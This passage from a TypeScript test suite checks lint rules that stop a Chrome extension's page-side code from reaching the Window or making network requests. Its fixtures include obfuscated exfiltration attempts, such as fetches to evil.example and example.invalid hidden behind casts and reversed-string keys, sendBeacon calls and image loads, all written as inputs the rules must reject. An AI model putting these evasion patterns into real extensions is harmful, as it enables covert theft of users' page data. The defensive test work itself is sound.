      await reached('src/select/overlay.ts', 'function f(win: Window) { return win; }'),
    ).not.toEqual([]);
    expect(
      await reached('src/result/app.ts', 'function f(win: Window) { return win; }'),
    ).not.toEqual([]);
    expect(
      await reached(
        'src/select/overlay.ts',
        "export function startSelection(page: Window): void { Object.assign(el.style, { left: '1px' }); void page.document; }",
      ),
    ).toEqual([]);
    // the screenshot of the service worker
    expect(
      await reached('src/background/measure.ts', 'const ratio = window.devicePixelRatio || 1;'),
    ).toEqual([]);
    expect(
      await reached('src/background/shot.ts', 'const ratio = window.devicePixelRatio || 1;'),
    ).not.toEqual([]);
    expect(await reached('src/background/shot.ts', 'void document.images;')).not.toEqual([]);
    expect(await reached('src/background/measure.ts', 'void document.body;')).not.toEqual([]);
    expect(await reached('src/result/index.ts', 'initResult(document);')).toEqual([]);
    expect(await reached('src/welcome/index.ts', 'void document.body;')).not.toEqual([]);
    expect(await reached('src/result/render.ts', 'void document.title;')).not.toEqual([]);
    expect(await reached('src/background/measure.ts', 'const w = window.document;')).not.toEqual(
      [],
    );
    expect(
      await reached('src/background/shot.ts', "const b = btoa('x') + String.fromCharCode(1);"),
    ).toEqual([]);
    // the service worker makes no request at all any more (connect-src 'self'): fetch is on no file's list
    expect(
      await reached('src/background/shot.ts', "await fetch(url, { credentials: 'omit' });"),
    ).not.toEqual([]);
    expect(
      await reached('src/result/render.ts', "await fetch('https://evil.example/');"),
    ).not.toEqual([]);
    expect(await reached('src/shared/ui.ts', 'await fetch(url);')).not.toEqual([]);
    // the shared capture codec
    expect(await reached('src/shared/capture.ts', 'const c = globalThis.crypto;')).toEqual([]);
    expect(await reached('src/shared/capture.ts', 'const c = globalThis.fetch;')).not.toEqual([]);
    expect(await reached('src/result/render.ts', 'const c = globalThis.crypto;')).not.toEqual([]);
    expect(await reached('src/shared/capture.ts', 'const m = decodeURIComponent(s);')).toEqual([]);
    expect(await reached('src/result/render.ts', 'const m = decodeURIComponent(s);')).not.toEqual(
      [],
    );
    // the runtime: one performance read, the descriptor read, the thread count
    const model =
      'const isolated = globalThis.crossOriginIsolated; const e = performance.getEntriesByType("resource"); ' +
      "const d = Object.getOwnPropertyDescriptor(o, 'x'); const r = await fetch(u);";
    expect(await reached('src/result/model.ts', model)).toEqual([]);
    expect(await reached('src/result/app.ts', model)).not.toEqual([]);
    expect(await reached('src/result/model.ts', 'performance.clearResourceTimings();')).not.toEqual(
      [],
    );
    expect(
      await reached('src/result/model.ts', 'performance.setResourceTimingBufferSize(0);'),
    ).not.toEqual([]);
    // the welcome page detects a Chrome event
    expect(await reached('src/welcome/app.ts', "const has = 'x' in chrome.action;")).toEqual([]);
    expect(await reached('src/result/app.ts', "const has = 'x' in chrome.action;")).not.toEqual([]);
  });

  it('is shadow-aware: a local variable that shares the name of a global is not the global', async () => {
    expect(
      await reached(
        'src/result/render.ts',
        'function f(top: number, parent: string) { const self = top + 1; return [top, parent, self]; }',
      ),
    ).toEqual([]);
    expect(
      await reached('src/result/render.ts', 'const top = rows.slice(0, 5); use(top);'),
    ).toEqual([]);
  });

  describe('the two pages that listen to their window', () => {
    const PAGES = ['src/result/app.ts', 'src/welcome/app.ts'];
    it('hold it in `win` and use it for win.location and win.addEventListener only', async () => {
      const ok =
        'const win = doc.defaultView; if (!win) return; const h = win.location.hash; ' +
        "win.addEventListener('hashchange', render); win.addEventListener('pagehide', stop);";
      for (const file of PAGES) expect(await flagged(file, ok), file).toEqual([]);
    });

    it.each([
      ['another name', 'const w = doc.defaultView;'],
      [
        'an object to assign to',
        'const win = doc.defaultView; Object.assign(win, { fetch: patched });',
      ],
      ['win passed on', 'const win = doc.defaultView; use(win);'],
      ['win.fetch', 'const win = doc.defaultView; win.fetch = patched;'],
      ['win.top', 'const win = doc.defaultView; const t = win.top;'],
      ['win.document', 'const win = doc.defaultView; const d = win.document;'],
      ['a computed member', "const win = doc.defaultView; win['fetch'] = patched;"],
      ['an alias', 'const win = doc.defaultView; const w = win;'],
      ['a second source', 'const win = doc.defaultView; const x = frame.contentWindow;'],
      ['a destructured defaultView', 'const { defaultView: win } = doc;'],
      ['a computed defaultView', "const win = doc['defaultView'];"],
    ])('refuse %s', async (_what, code) => {
      for (const file of PAGES)
        expect(await flagged(file, code), `${file}: ${code}`).not.toEqual([]);
    });

    it('is not allowed anywhere else', async () => {
      expect(
        await flagged('src/result/render.ts', 'const win = doc.defaultView; win.location.hash;'),
      ).not.toEqual([]);
    });
  });
});

// Round 4 of the review of PR #6 (blocker D): src/select/index.ts hands `window` to startSelection(win: Window), and the content
// script runs in the web page's process, where the CSP of the extension does not apply. The allowlist of GLOBAL_ACCESS looks
// at globals only, so `win.fetch(url)`, a cast, an alias, ... passed everything. And `this` of a callback is the window.
describe('the Window of the content script is used through a closed list of members', () => {
  const OVERLAY = 'src/select/overlay.ts';
  // the URLs of every fixture are on example.invalid, which never resolves
  const URL_PARTS = "['https:/', 'example.invalid', 'm'].join('/')";

  it('accepts the overlay as it is: win.document/addEventListener/removeEventListener/getSelection/requestAnimationFrame/devicePixelRatio and the marker', async () => {
    const code = [
      'export function startSelection(win: Window): void {',
      '  if (win.__fontsnapActive === true) return;',
      '  win.__fontsnapActive = true;',
      '  const doc = win.document;',
      "  win.addEventListener('keydown', key, true);",
      "  win.removeEventListener('keydown', key, true);",
      '  const text = win.getSelection()?.toString();',
      '  win.requestAnimationFrame(() => { win.requestAnimationFrame(() => undefined); });',
      '  const ratio = win.devicePixelRatio || 1;',
      '  win.__fontsnapActive = false;',
      '}',
    ].join('\n');
    expect(await either(OVERLAY, code)).toEqual([]);
  });

  it.each([
    // the mutation of the reviewer, word for word
    [
      'win.fetch',
      `void win.fetch(${URL_PARTS}).then(async (r) => sendMessage({ type: 'fontsnap-rect', text: await r.text() }));`,
    ],
    ['win.fetch with a plain URL', "void win.fetch('https://example.invalid/m');"],
    ['win.XMLHttpRequest', 'const x = new win.XMLHttpRequest();'],
    ['win.WebSocket', "const s = new win.WebSocket('wss://example.invalid/');"],
    ['win.navigator', 'win.navigator.sendBeacon(u, d);'],
    ['win.location', "win.location.href = 'https://example.invalid/';"],
    [
      'win.top, win.parent, win.opener, win.frames',
      'const w = [win.top, win.parent, win.opener, win.frames];',
    ],
    ['win.eval', "win.eval('1');"],
    ['win.setTimeout', "win.setTimeout('1', 0);"],
    // the cast the overlay used to have, and the other ways to hold or pass it on
    [
      'a cast to a Record',
      "const flags = win as unknown as Record<string, unknown>; flags['k'] = true;",
    ],
    [
      'a cast to a type with fetch',
      'const w = win as unknown as { fetch: typeof fetch }; void w.fetch(u);',
    ],
    ['an alias', 'const w = win; void w;'],
    ['an alias of a member of it that is a window', 'const w = win.document.defaultView;'],
    ['a destructured fetch', 'const { fetch } = win; void fetch(u);'],
    ['a destructured fetch, renamed', 'const { fetch: f } = win; void f(u);'],
    ['a computed name', 'void win[name];'],
    ['a computed literal', "void win['fetch'](u);"],
    ['a template name', 'void win[`fetch`](u);'],
    ['passing it on', 'use(win);'],
    ['returning it', 'const f = () => win; void f;'],
    ['a spread', 'const copy = { ...win };'],
    ['Object.assign onto it', 'Object.assign(win, { fetch: patched });'],
    ['Reflect.get on it', "Reflect.get(win, 'fetch');"],
    ['a write to a member', 'win.devicePixelRatio = 1;'],
    ['a write to the document', "win.document.title = 'x';"],
    ["a write to the marker's neighbour", 'win.__fontsnapActive2 = true;'],
    ['an update', 'win.devicePixelRatio++;'],
    ['a delete', 'delete win.__fontsnapActive;'],
    ['an optional call of fetch', 'void win.fetch?.(u);'],
    ['a typeof', 'const k = typeof win.fetch;'],
  ])('refuses %s', async (_what, code) => {
    expect(await either(OVERLAY, code), code).not.toEqual([]);
  });

  it('is the overlay that gets this treatment: another file may not name win this way, and index.ts only passes window on', async () => {
    expect(await reached('src/select/index.ts', 'startSelection(window);')).toEqual([]);
    for (const code of [
      'window.fetch(u);',
      'const w = window;',
      'window.document;',
      'self.fetch(u);',
      'globalThis.fetch(u);',
    ]) {
      expect(await either('src/select/index.ts', code), code).not.toEqual([]);
    }
    expect(await reached('src/select/overlay.ts', 'window.fetch(u);')).not.toEqual([]);
  });

  it('keeps the other restrictions of src/ on the overlay', async () => {
    for (const code of [
      'eval("1");',
      'document.write("x");',
      'const w = document.defaultView;',
      'Object.defineProperty(el, "a", d);',
    ]) {
      expect(await either(OVERLAY, code), code).not.toEqual([]);
    }
  });

  it('holds measureImage, which runs in the page through chrome.scripting, to the same list: window.devicePixelRatio, document, requestAnimationFrame', async () => {
    const measure = 'src/background/measure.ts';
    const ok =
      'const img = [...document.images][0]; requestAnimationFrame(() => undefined); const dpr = window.devicePixelRatio || 1;';
    expect(await either(measure, ok)).toEqual([]);
    for (const code of [
      "void fetch('https://example.invalid/m');",
      'void window.fetch(u);',
      'void window.document;',
      "void new Request('https://example.invalid/m');",
      'const w = window; void w;',
      'void self.fetch(u);',
      'void globalThis.fetch(u);',
      'void document.defaultView;',
      'void navigator.sendBeacon(u, d);',
      'void new XMLHttpRequest();',
    ]) {
      expect(await either(measure, code), code).not.toEqual([]);
    }
  });
});

describe('`this` is the global object when a function is called as a callback', () => {
  const FILES = [
    'src/result/render.ts',
    'src/background/handlers.ts',
    'src/shared/messaging.ts',
    'src/select/overlay.ts',
    'src/result/model.ts',
  ];

  it.each([
    [
      'a setTimeout callback (the mutation of the reviewer)',
      'setTimeout(function (this: Record<string, unknown>) { this[key] = evil; }, 0);',
    ],
    ['a function expression', 'const f = function () { return this; }; void f;'],
    ['a function declaration', 'function f() { return this; } void f;'],
    ['a this parameter', 'function f(this: Window) { return 1; } void f;'],
    ['a this parameter of a method', 'class A { m(this: A) { return 1; } }'],
    [
      'a this parameter of an arrow type',
      'type F = (this: Window) => void; const f: F = () => undefined; void f;',
    ],
    ['an arrow function at the top level', 'const f = () => this; void f;'],
    ['an arrow function in a function', 'function f() { return () => this; } void f;'],
    ['a method of a class', 'class A { m() { return this; } }'],
    ['a method used as a callback', 'class A { m() { return this; } } setTimeout(new A().m, 0);'],
    ['a getter', 'class A { get v() { return this; } }'],
    ['a static method', 'class A { static m() { return this; } }'],
    ['a field initialiser', 'class A { x = this; }'],
    ['an object method', 'const o = { m() { return this; } }; void o;'],
    [
      'a function nested in a constructor',
      'class A { constructor() { setTimeout(function () { this.x = 1; }, 0); } }',
    ],
    [
      'a function declaration in a constructor',
      'class A { constructor() { function f() { return this; } void f; } }',
    ],
    ['a plain top-level this', 'const g = this; void g;'],
    ['this.constructor', 'const c = this.constructor; void c;'],
  ])('refuses %s', async (_what, code) => {
    for (const file of FILES) expect(await flagged(file, code), `${file}: ${code}`).not.toEqual([]);
  });

  it('allows this in the constructor of a class, and an arrow function inside it (the instance)', async () => {
    for (const code of [
      "class MessagingError extends Error { constructor(m: string) { super(m); this.name = 'MessagingError'; } }",
      'class A { x = 1; constructor() { const f = () => this.x; void f; } }',
    ]) {
      for (const file of FILES) expect(await flagged(file, code), `${file}: ${code}`).toEqual([]);
    }
  });

  it('is part of every context of src/, d.ts files included', async () => {
    expect(
      await flagged('src/env.d.ts', 'const f = function () { return this; }; void f;'),
    ).not.toEqual([]);
    expect(await flagged('src/shared/format.ts', 'const g = this; void g;')).not.toEqual([]);
  });
});

// Round 5 of the review of PR #6 (blocker D, continued): the allowlist of members was tied to the NAME `win`, so renaming the
// parameter, or reaching the Window through `doc`, an event or `document` with a key built at run time, gave a fetch in the
// content script (no CSP there) with lint, tsc, unit tests and build green. The class is closed, not the four examples:
// the Window is the first parameter of startSelection under any name; the code that runs in the web page has no computed key,
// no cast, no Object.*, only div elements. Every address below is on example.invalid.
describe('the code that runs in the web page cannot reach the Window or a global by any key', () => {
  const OVERLAY = 'src/select/overlay.ts';
  const MEASURE = 'src/background/measure.ts';
  const INDEX = 'src/select/index.ts';
  const URL_PARTS = "['https:/', 'example.invalid', 'm'].join('/')";
  const FETCH = "['h', 'c', 't', 'e', 'f'].reverse().join('')";
  const inStart = (body: string, name = 'win'): string =>
    `export function startSelection(${name}: Window): void {\n  const doc = ${name}.document;\n${body}\n}`;

  const fixtures: [string, string][] = [
    // the four of the reviewer, word for word (r4307135840)
    [
      '(1) the parameter renamed to w, the window cast and indexed by a key built at run time',
      `export function startSelection(w: Window): void {
  const doc = w.document;
  const g = (w as unknown as Record<string, (u: string) => Promise<Response>>)[${FETCH}];
  void g?.(${URL_PARTS}).then(async (r) => sendMessage({ type: 'fontsnap-rect', rect: { x: 0, y: 0, w: 0, h: 0 }, dpr: 1, text: await r.text() }));
  void doc;
}`,
    ],
    [
      '(1b) the renamed parameter, w.fetch with a literal',
      inStart(`  void w.fetch(${URL_PARTS});`, 'w'),
    ],
    [
      '(2) doc cast to a Record and indexed by [default, View]',
      inStart(`  const k = ['default', 'View'].join('');
  const dw = (doc as unknown as Record<string, Record<string, (u: string) => Promise<Response>> | undefined>)[k];
  void dw?.[${FETCH}]?.(${URL_PARTS});`),
    ],
    [
      '(3) the same through currentTarget of a KeyboardEvent',
      inStart(`  win.addEventListener('keydown', (e: KeyboardEvent) => {
    const k = ['current', 'Target'].join('');
    const dw = (e as unknown as Record<string, Record<string, (u: string) => Promise<Response>> | undefined>)[k];
    void dw?.[${FETCH}]?.(${URL_PARTS});
  });`),
    ],
    [
      '(4) measureImage: document cast, [default, View], then fetch',
      `export async function measureImage(src: string): Promise<null> {
  void src;
  void (document as unknown as Record<string, { fetch?: (u: string) => Promise<Response> }>)[['default', 'View'].join('')]?.fetch?.(${URL_PARTS});
  return null;
}`,
    ],
    // the class: the Window of startSelection under any name
    ['the Window aliased after a rename', inStart('  const x = w;\n  void x;', 'w')],
    [
      'a second alias of the first parameter, any name',
      inStart('  const y = anything;\n  void y;', 'anything'),
    ],
    ['the Window passed on', inStart('  leak(win);')],
    ['the Window returned', inStart('  const f = () => win;\n  void f;')],
    ['the Window destructured', inStart('  const { fetch: f } = win;\n  void f;')],
    ['the Window reassigned', inStart('  win = other;')],
    [
      'the Window as a default of another parameter',
      inStart('  const f = (p = win) => p;\n  void f;'),
    ],
    ['the Window in an array', inStart('  const ws = [win];\n  void ws;')],
    ['the Window in an object literal', inStart('  const o = { win };\n  void o;')],
    ['the Window in a template', inStart('  const t = `${win}`;\n  void t;')],
    ['the Window in a conditional', inStart('  const w2 = cond ? win : other;\n  void w2;')],
    ['the Window in a logical', inStart('  const w2 = win || other;\n  void w2;')],
    ['a member that is not on the list', inStart('  void win.fetch;')],
    ['a member of a member written', inStart("  win.document.title = 'x';")],
    // the Window type anywhere but on that parameter
    [
      'a second parameter typed Window',
      'export function startSelection(win: Window, other: Window): void {\n  void win.document;\n  void other;\n}',
    ],
    ['a variable typed Window', inStart('  let v: Window | undefined;\n  void v;')],
    ['a Window generic argument', inStart('  const a: Array<Window> = [];\n  void a;')],
    ['a Window in a function type', inStart('  const f = (p: Window) => p;\n  void f;')],
    ['typeof globalThis', inStart('  let g: typeof globalThis | undefined;\n  void g;')],
    ['Document[defaultView]', inStart("  let g: Document['defaultView'] | undefined;\n  void g;")],
    ['WindowProxy', inStart('  let g: WindowProxy | undefined;\n  void g;')],
    [
      'the first parameter missing a Window annotation is not a way round',
      'export function startSelection(): void { void 1; }',
    ],
    ['startSelection missing', 'export function begin(win: Window): void { void win.document; }'],
    // computed keys, casts, enumeration, in every shape
    ['a computed key on the document', inStart('  void doc[k];')],
    [
      'a computed key on an element',
      inStart("  const el = doc.createElement('div');\n  void el[k];"),
    ],
    [
      'a computed key on an event',
      inStart("  win.addEventListener('keydown', (e: KeyboardEvent) => { void e[k]; });"),
    ],
    ['an optional computed key', inStart('  void doc?.[k];')],
    ['a template key', inStart('  void doc[`defaultView`];')],
    ['a string literal key', inStart("  void doc['defaultView'];")],
    ['a computed key in a pattern', inStart('  const { [k]: v } = doc;\n  void v;')],
    ['a computed key in an object literal', inStart('  const o = { [k]: 1 };\n  void o;')],
    ['a computed class member', inStart('  class A { [k] = 1; }\n  void A;')],
    ['a cast to unknown', inStart('  void (doc as unknown);')],
    ['a cast to any', inStart('  void (doc as any);')],
    ['a cast to a Record', inStart('  void (doc as Record<string, unknown>);')],
    ['a cast to an object', inStart('  void (doc as object);')],
    ['a cast to an interface', inStart('  void (doc as { fetch: typeof fetch });')],
    ['an angle-bracket cast', inStart('  void (<unknown>doc);')],
    ['a double cast', inStart('  void (doc as unknown as Window);')],
    ['a non-const assertion of a literal', inStart("  void ('x' as string);")],
    [
      'an index signature type',
      inStart('  let t: { [key: string]: unknown } | undefined;\n  void t;'),
    ],
    ['a Record annotation', inStart('  let r: Record<string, unknown> | undefined;\n  void r;')],
    ['for...in over the window', inStart('  for (const key in win) { void key; }')],
    ['for...in over the document', inStart('  for (const key in doc) { void key; }')],
    ['typeof as a type', inStart('  let t: typeof doc | undefined;\n  void t;')],
    [
      'a mapped type',
      inStart('  let t: { [P in keyof Document]?: Document[P] } | undefined;\n  void t;'),
    ],
    // reaching a Window from a node, an event or a selection (the names, which no key can hide any more)
    [
      'Event.view',
      inStart("  win.addEventListener('click', (e: MouseEvent) => { void e.view; });"),
    ],
    [
      'target.ownerDocument.defaultView',
      inStart("  win.addEventListener('click', (e: MouseEvent) => { void e.target; });"),
    ],
    ['ownerDocument.defaultView', inStart('  void doc.body.ownerDocument.defaultView;')],
    [
      'currentTarget',
      inStart("  win.addEventListener('click', (e: MouseEvent) => { void e.currentTarget; });"),
    ],
    [
      'srcElement',
      inStart("  win.addEventListener('click', (e: MouseEvent) => { void e.srcElement; });"),
    ],
    [
      'composedPath',
      inStart("  win.addEventListener('click', (e: MouseEvent) => { void e.composedPath(); });"),
    ],
    [
      'relatedTarget',
      inStart("  win.addEventListener('click', (e: MouseEvent) => { void e.relatedTarget; });"),
    ],
    [
      'a selection node document',
      inStart('  void win.getSelection()?.anchorNode?.ownerDocument?.defaultView;'),
    ],
    // Object.*, Reflect, Function.prototype, spread
    [
      'Object.getOwnPropertyDescriptor on the document',
      inStart("  void Object.getOwnPropertyDescriptor(doc, 'defaultView');"),
    ],
    ['Object.getOwnPropertyDescriptors', inStart('  void Object.getOwnPropertyDescriptors(doc);')],
    ['Object.entries on the document', inStart('  void Object.entries(doc);')],
    [
      'Object.values on an event',
      inStart("  win.addEventListener('click', (e: MouseEvent) => { void Object.values(e); });"),
    ],
    ['Object.keys', inStart('  void Object.keys(doc);')],
    ['Object.hasOwn', inStart("  void Object.hasOwn(doc, 'x');")],
    ['Object.assign({}, win)', inStart('  void Object.assign({}, win);')],
    ['Object.assign({}, doc)', inStart('  void Object.assign({}, doc);')],
    ['Object.assign on a non-style', inStart('  void Object.assign(doc, { a: 1 });')],
    ['Object as a value', inStart('  const O = Object;\n  void O;')],
    ['Reflect.get', inStart("  void Reflect.get(doc, 'defaultView');")],
    ['Reflect.ownKeys', inStart('  void Reflect.ownKeys(doc);')],
    ['Reflect.apply', inStart('  void Reflect.apply(f, win, []);')],
    ['Function.prototype.call with the window', inStart('  void f.call(win);')],
    ['Function.prototype.apply with the window', inStart('  void f.apply(win, []);')],
    ['bind with the window', inStart('  void f.bind(win);')],
    ['a spread of the window', inStart('  void { ...win };')],
    [
      'a spread of an event',
      inStart("  win.addEventListener('keydown', (e: KeyboardEvent) => { void { ...e }; });"),
    ],
    ['a spread of the document', inStart('  const copy = { ...doc };\\n  void copy;')],
    ['a spread of the window into a call', inStart('  void f(...[win]);')],
    ['with', inStart('  with (win) { void fetch; }')],
    ['this in a callback', inStart('  setTimeout(function () { void this; }, 0);')],
    // loading something or navigating
    ['an img element', inStart("  void doc.createElement('img');")],
    ['a link element', inStart("  void doc.createElement('link');")],
    ['createElement with a variable', inStart('  void doc.createElement(tag);')],
    ['createElement with a template', inStart('  void doc.createElement(`img`);')],
    [
      'src',
      inStart("  const d = doc.createElement('div');\n  d.src = 'https://example.invalid/m';"),
    ],
    [
      'href',
      inStart("  const d = doc.createElement('div');\n  d.href = 'https://example.invalid/m';"),
    ],
    ['location', inStart("  doc.location = 'https://example.invalid/m';")],
    ['innerHTML', inStart("  doc.body.innerHTML = '<img src=https://example.invalid/m>';")],
    ['setAttribute', inStart("  doc.body.setAttribute('src', 'https://example.invalid/m');")],
    ['insertAdjacentHTML', inStart("  doc.body.insertAdjacentHTML('beforeend', '<p></p>');")],
    [
      'a url() in a style',
      inStart("  Object.assign(doc.body.style, { background: 'url(https://example.invalid/m)' });"),
    ],
    [
      'a url() with a space',
      inStart(
        "  Object.assign(doc.body.style, { background: 'URL (https://example.invalid/m)' });",
      ),
    ],
    [
      'a url() in a template',
      inStart('  Object.assign(doc.body.style, { background: `url(${k})` });'),
    ],
    ['image-set()', inStart("  Object.assign(doc.body.style, { background: 'image-set(x 1x)' });")],
    ['document.write', inStart("  doc.write('x');")],
    ['window.open', inStart('  doc.open();')],
  ];

  it.each(fixtures)('refuses %s', async (_what, code) => {
    const file = _what.startsWith('(4)') ? MEASURE : OVERLAY;
    expect(await either(file, code), code).not.toEqual([]);
  });

  it('accepts the overlay with the parameter under another name, and every use the real overlay makes', async () => {
    const code = [
      'export function startSelection(page: Window): void {',
      '  if (page.__fontsnapActive === true) return;',
      '  page.__fontsnapActive = true;',
      '  const doc = page.document;',
      "  const el = doc.createElement('div');",
      "  Object.assign(el.style, { position: 'fixed', top: '12px' });",
      '  el.textContent = t(key);',
      '  doc.documentElement.appendChild(el);',
      "  page.addEventListener('keydown', onKey, true);",
      '  const text = page.getSelection()?.toString();',
      '  page.requestAnimationFrame(() => undefined);',
      '  const ratio = page.devicePixelRatio || 1;',
      '  page.__fontsnapActive = false;',
      '}',
    ].join('\n');
    expect(await either(OVERLAY, code)).toEqual([]);
  });

  it('accepts the measuring function as it is', async () => {
    const code = [
      'export async function measureImage(src: string): Promise<{ dpr: number } | null> {',
      '  const img = [...document.images].find((i) => i.currentSrc === src || i.src === src);',
      '  if (!img) return null;',
      "  img.scrollIntoView({ block: 'nearest', inline: 'nearest' });",
      '  await new Promise((ok) => { requestAnimationFrame(() => { requestAnimationFrame(ok); }); });',
      '  const b = img.getBoundingClientRect();',
      '  return { dpr: window.devicePixelRatio || 1 + b.left };',
      '}',
    ].join('\n');
    expect(await either(MEASURE, code)).toEqual([]);
  });

  it('holds select/index.ts and measure.ts to the same rules', async () => {
    for (const file of [INDEX, MEASURE]) {
      for (const code of [
        'void ([1][k]);',
        'void (x as unknown);',
        'for (const k in x) { void k; }',
        'void Object.keys(x);',
        "void document.createElement('img');",
      ]) {
        expect(await either(file, code), `${file}: ${code}`).not.toEqual([]);
      }
    }
    expect(await either(INDEX, 'startSelection(window);')).toEqual([]);
    expect(await either(MEASURE, 'void [1, 2][0];')).toEqual([]);
  });

  it('a numeric index is fine, any other computed key is not', async () => {
    expect(await either(MEASURE, 'void [1, 2][0] + [3][12];')).toEqual([]);
    expect(await either(MEASURE, 'void [1][-1];')).not.toEqual([]);
    expect(await either(MEASURE, 'void [1][1 + 1];')).not.toEqual([]);
    expect(await either(MEASURE, "void [1]['0'];")).not.toEqual([]);
  });

  describe('chrome.scripting.executeScript runs one function in the page, and it is measureImage', () => {
    const FILES = ['src/background/shot.ts', 'src/background/handlers.ts', 'src/result/app.ts'];
    it.each([
      [
        'another function',
        'await chrome.scripting.executeScript({ target: { tabId: 1 }, func: other });',
      ],
      [
        'an inline arrow',
        'await chrome.scripting.executeScript({ target: { tabId: 1 }, func: () => 1 });',
      ],
      [
        'an inline function',
        'await chrome.scripting.executeScript({ target: { tabId: 1 }, func: function () { return 1; } });',
      ],
      [
        'func under a string key',
        "await chrome.scripting.executeScript({ target: { tabId: 1 }, 'func': other });",
      ],
      [
        'func under a computed key',
        "await chrome.scripting.executeScript({ target: { tabId: 1 }, ['fu' + 'nc']: other });",
      ],
      [
        'a spread of options',
        'await chrome.scripting.executeScript({ target: { tabId: 1 }, ...options });',
      ],
      ['options in a variable', 'await chrome.scripting.executeScript(options);'],
      [
        'the main world',
        "await chrome.scripting.executeScript({ target: { tabId: 1 }, files: ['a.js'], world: 'MAIN' });",
      ],
      [
        'the main world under a string key',
        "await chrome.scripting.executeScript({ target: { tabId: 1 }, files: ['a.js'], 'world': 'MAIN' });",
      ],
      [
        'an alias of executeScript',
        'const run = chrome.scripting.executeScript;\nawait run({ target: { tabId: 1 }, func: other });',
      ],
      ['executeScript passed on', 'use(chrome.scripting.executeScript);'],
      [
        'a call through call()',
        'await chrome.scripting.executeScript.call(null, { func: other });',
      ],
    ])('refuses %s', async (_what, code) => {
      for (const file of FILES)
        expect(await either(file, code), `${file}: ${code}`).not.toEqual([]);
    });

    it('accepts measureImage and the content script file', async () => {
      for (const file of FILES) {
        expect(
          await flagged(
            file,
            'await chrome.scripting.executeScript({ target: { tabId, frameIds: [frameId] }, args: [u], func: measureImage });',
          ),
          file,
        ).toEqual([]);
        expect(
          await flagged(
            file,
            "await chrome.scripting.executeScript({ target: { tabId: tab.id }, files: ['select.js'] });",
          ),
          file,
        ).toEqual([]);
      }
    });
  });

  // Round 1 of the review of PR #14 (B1): only the name of `func` was judged, so "the frame of the click only" and "only the srcUrl of
  // the click" rested on how clicked.ts happened to be written. Every mutation below passed lint and verify-dist.
  describe('executeScript: the target is one tab and one frame, the loader gets the srcUrl of the click and nothing else', () => {
    const FILES = ['src/background/clicked.ts', 'src/background/shot.ts', 'src/result/app.ts'];
    const CLICKED = 'src/background/clicked.ts';
    const HANDLERS = 'src/background/handlers.ts';
    const inClicked = (call: string, before = ''): string =>
      `export async function clickedImage(info: ClickedImageInfo, tab: Tab): Promise<void> {\n  const tabId = 1;\n  const frameId = 0;\n  ${before}\n  await ${call};\n}`;
    const run = (target: string, args: string, func: string): string =>
      `chrome.scripting.executeScript({ target: ${target}, args: ${args}, func: ${func} })`;
    const OK_TARGET = '{ tabId, frameIds: [frameId] }';
    const OK_LOAD = run(OK_TARGET, '[info.srcUrl]', 'loadImagePixels');

    it('accepts the real shapes', async () => {
      for (const call of [
        OK_LOAD,
        run(OK_TARGET, '[u, k, null]', 'measureImage'),
        run('{ tabId: tab.id, frameIds: [frameId] }', '[u]', 'measureImage'),
      ]) {
        expect(await flagged(CLICKED, inClicked(call)), call).toEqual([]);
      }
    });

    it.each([
      // --- the mutations of the review, for both functions
      [
        'allFrames on the loader',
        run('{ tabId, allFrames: true }', '[info.srcUrl]', 'loadImagePixels'),
      ],
      ['allFrames on measureImage', run('{ tabId, allFrames: true }', '[u]', 'measureImage')],
      [
        'allFrames next to frameIds',
        run('{ tabId, frameIds: [frameId], allFrames: true }', '[info.srcUrl]', 'loadImagePixels'),
      ],
      [
        'a second frame id',
        run('{ tabId, frameIds: [frameId, 0] }', '[info.srcUrl]', 'loadImagePixels'),
      ],
      [
        'a second frame id for measureImage',
        run('{ tabId, frameIds: [frameId, 0] }', '[u]', 'measureImage'),
      ],
      ['documentIds', run("{ tabId, documentIds: ['x'] }", '[info.srcUrl]', 'loadImagePixels')],
      // --- other shapes of the target
      [
        'a spread in the target',
        run('{ tabId, frameIds: [frameId], ...more }', '[info.srcUrl]', 'loadImagePixels'),
      ],
      [
        'no frameIds (the top frame, not the frame of the click)',
        run('{ tabId }', '[info.srcUrl]', 'loadImagePixels'),
      ],
      ['a target in a variable', run('base', '[info.srcUrl]', 'loadImagePixels')],
      [
        'a computed key',
        run("{ tabId, ['all' + 'Frames']: true }", '[info.srcUrl]', 'loadImagePixels'),
      ],
      ['a string key', run("{ tabId, 'allFrames': true }", '[info.srcUrl]', 'loadImagePixels')],
      [
        'frameIds in a variable',
        run('{ tabId, frameIds: ids }', '[info.srcUrl]', 'loadImagePixels'),
      ],
      [
        'a spread in frameIds',
        run('{ tabId, frameIds: [...ids] }', '[info.srcUrl]', 'loadImagePixels'),
      ],
      [
        'an expression as the frame id',
        run('{ tabId, frameIds: [frameId + 1] }', '[info.srcUrl]', 'loadImagePixels'),
      ],
      [
        'a literal tab id',
        run('{ tabId: 1, frameIds: [frameId] }', '[info.srcUrl]', 'loadImagePixels'),
      ],
      [
        'an expression as the tab id',
        run('{ tabId: tab.id ?? 1, frameIds: [frameId] }', '[info.srcUrl]', 'loadImagePixels'),
      ],
      [
        'an option that is not listed',
        'chrome.scripting.executeScript({ target: { tabId, frameIds: [frameId] }, injectImmediately: true, args: [info.srcUrl], func: loadImagePixels })',
      ],
      [
        'allFrames for the content script file',
        "chrome.scripting.executeScript({ target: { tabId, allFrames: true }, files: ['select.js'] })",
      ],
      // --- what the loader is given
      [
        'the srcUrl plus a suffix (the loader asked for ...?leak=1)',
        run(OK_TARGET, "[info.srcUrl + '?leak=1']", 'loadImagePixels'),
      ],
      [
        'the frame URL as a fallback of the srcUrl',
        run(OK_TARGET, '[info.frameUrl ?? info.srcUrl]', 'loadImagePixels'),
      ],
      ['the frame URL', run(OK_TARGET, '[info.frameUrl]', 'loadImagePixels')],
      [
        'an address in a literal',
        run(OK_TARGET, "['https://example.invalid/x']", 'loadImagePixels'),
      ],
      ['new URL', run(OK_TARGET, "[new URL('x', info.srcUrl).href]", 'loadImagePixels')],
      ['a template', run(OK_TARGET, '[`${info.srcUrl}#x`]', 'loadImagePixels')],
      ['a second argument', run(OK_TARGET, "[info.srcUrl, 'x']", 'loadImagePixels')],
      ['no arguments', run(OK_TARGET, '[]', 'loadImagePixels')],
      [
        'no args key',
        'chrome.scripting.executeScript({ target: { tabId, frameIds: [frameId] }, func: loadImagePixels })',
      ],
      ['args in a variable', run(OK_TARGET, 'list', 'loadImagePixels')],
      ['a spread in args', run(OK_TARGET, '[...list]', 'loadImagePixels')],
      ['a bare name', run(OK_TARGET, '[srcUrl]', 'loadImagePixels')],
      ['an optional chain', run(OK_TARGET, '[info?.srcUrl]', 'loadImagePixels')],
      ['a computed member', run(OK_TARGET, "[info['srcUrl']]", 'loadImagePixels')],
    ])('refuses %s', async (_what, call) => {
